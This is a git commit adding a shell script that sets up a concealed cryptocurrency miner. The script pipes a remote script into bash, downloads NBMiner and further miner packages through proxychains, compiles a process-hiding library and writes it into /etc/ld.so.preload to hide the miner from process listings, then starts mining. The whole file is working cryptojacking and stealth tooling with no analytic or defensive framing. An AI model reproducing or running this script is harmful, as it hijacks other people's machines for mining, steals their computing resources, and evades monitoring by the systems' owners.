1a25b2adc846225a79abb5558b3a9f43b869299a
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-01-12 11:29:43 +0200

    Create start_nbHive.sh

---
+++ start_nbHive.sh
@@ -0,0 +1,21 @@
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+proxychains curl ifconfig.me
+proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.0/NBMiner_36.0_Linux.tgz
+tar -xvzf NBMiner_36.0_Linux.tgz
+cd NBMiner_Linux
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PowETH.zip
+unzip PowETH.zip
+chmod +x start_2miners.sh
+chmod +x start_flypool.sh
+chmod +x start_hiveon.sh
+chmod +x start_ravenminerpplns.sh
+chmod +x start_ravenminerpps.sh
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbHiveon.sh
+chmod +x nbHiveon.sh
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+unzip magicNb.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./nbHiveon.sh
